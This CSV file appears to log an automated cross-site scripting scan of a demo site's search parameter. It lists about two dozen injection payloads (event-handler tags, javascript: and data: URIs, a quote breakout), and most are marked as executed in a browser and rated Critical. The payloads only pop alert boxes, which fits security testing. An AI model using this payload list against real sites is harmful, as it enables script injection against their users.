Payload_Start_Time,Payload_End_Time,Duration_Seconds,Target_URL,HTTP_Method,Parameter,Payload,Reflection_Type,Browser_Verified,XSS_Event_Type,Severity
2026-01-10 16:54:53.592,2026-01-10 16:54:54.343,0.751,https://demo-knsl.onrender.com/search,GET,q,<body onfocus=alert(1)>,RAW_REFLECTION,No,,High
2026-01-10 16:54:54.344,2026-01-10 16:54:55.146,0.803,https://demo-knsl.onrender.com/search,GET,q,<body onhashchange=alert(1)>,RAW_REFLECTION,No,,High
2026-01-10 16:54:55.146,2026-01-10 16:54:55.392,0.246,https://demo-knsl.onrender.com/search,GET,q,<body onload=prompt(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 16:54:55.392,2026-01-10 16:54:55.630,0.238,https://demo-knsl.onrender.com/search,GET,q,<body onload=confirm(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 16:54:55.630,2026-01-10 16:54:55.884,0.255,https://demo-knsl.onrender.com/search,GET,q,<input onfocus=alert(1) autofocus>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 16:54:55.884,2026-01-10 16:54:56.045,0.161,https://demo-knsl.onrender.com/search,GET,q,<input onblur=alert(1) autofocus><input>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 16:54:56.045,2026-01-10 16:54:56.151,0.106,https://demo-knsl.onrender.com/search,GET,q,<input type=text value=x onfocus=alert(1) autofocus>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 16:54:56.151,2026-01-10 16:54:56.225,0.074,https://demo-knsl.onrender.com/search,GET,q,<input type=button value=xss onclick=alert(1)>,NO_REFLECTION,No,,Info
2026-01-10 16:54:56.225,2026-01-10 16:54:56.340,0.115,https://demo-knsl.onrender.com/search,GET,q,<input type=image src=x onerror=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 16:54:56.340,2026-01-10 16:54:56.474,0.134,https://demo-knsl.onrender.com/search,GET,q,<iframe src=javascript:alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 16:54:56.474,2026-01-10 16:54:56.590,0.116,https://demo-knsl.onrender.com/search,GET,q,"<iframe src=""javascript:alert(1)"">",RAW_REFLECTION,Yes,alert,Critical
2026-01-10 16:54:56.590,2026-01-10 16:54:56.702,0.113,https://demo-knsl.onrender.com/search,GET,q,<iframe onload=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 16:54:56.702,2026-01-10 16:54:56.821,0.118,https://demo-knsl.onrender.com/search,GET,q,<iframe/onload=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 16:54:56.821,2026-01-10 16:54:56.946,0.126,https://demo-knsl.onrender.com/search,GET,q,"<iframe  rc=""data:text/html,<script>alert(1)</script>"">",RAW_REFLECTION,Yes,alert,Critical
2026-01-10 16:54:56.946,2026-01-10 16:54:57.062,0.116,https://demo-knsl.onrender.com/search,GET,q,'-alert(1)-',RAW_REFLECTION,Yes,alert,Critical
2026-01-10 16:54:57.062,2026-01-10 16:54:57.187,0.125,https://demo-knsl.onrender.com/search,GET,q,<details open ontoggle=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 16:54:57.187,2026-01-10 16:54:57.298,0.111,https://demo-knsl.onrender.com/search,GET,q,<details ontoggle=alert(1)><summary>xss</summary></details>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 16:54:57.298,2026-01-10 16:54:57.353,0.055,https://demo-knsl.onrender.com/search,GET,q,<details open ontoggle=prompt(1)>,NO_REFLECTION,No,,Info
2026-01-10 16:54:57.353,2026-01-10 16:54:57.460,0.107,https://demo-knsl.onrender.com/search,GET,q,<object data=javascript:alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 16:54:57.460,2026-01-10 16:54:57.578,0.119,https://demo-knsl.onrender.com/search,GET,q,<embed src=javascript:alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 16:54:57.578,2026-01-10 16:54:57.699,0.121,https://demo-knsl.onrender.com/search,GET,q,"<object data=""data:text/html,<script>alert(1)</script>"">",RAW_REFLECTION,Yes,alert,Critical
2026-01-10 16:54:57.699,2026-01-10 16:54:57.820,0.121,https://demo-knsl.onrender.com/search,GET,q,<select onfocus=alert(1) autofocus>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 16:54:57.820,2026-01-10 16:54:57.948,0.128,https://demo-knsl.onrender.com/search,GET,q,<textarea onfocus=alert(1) autofocus>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 16:54:57.948,2026-01-10 16:54:58.100,0.152,https://demo-knsl.onrender.com/search,GET,q,<keygen onfocus=alert(1) autofocus>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 16:54:58.100,2026-01-10 16:54:58.232,0.133,https://demo-knsl.onrender.com/search,GET,q,<marquee onstart=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 16:54:58.232,2026-01-10 16:54:58.359,0.127,https://demo-knsl.onrender.com/search,GET,q,<marquee loop=1 onfinish=alert(1)>x</marquee>,RAW_REFLECTION,Yes,alert,Critical
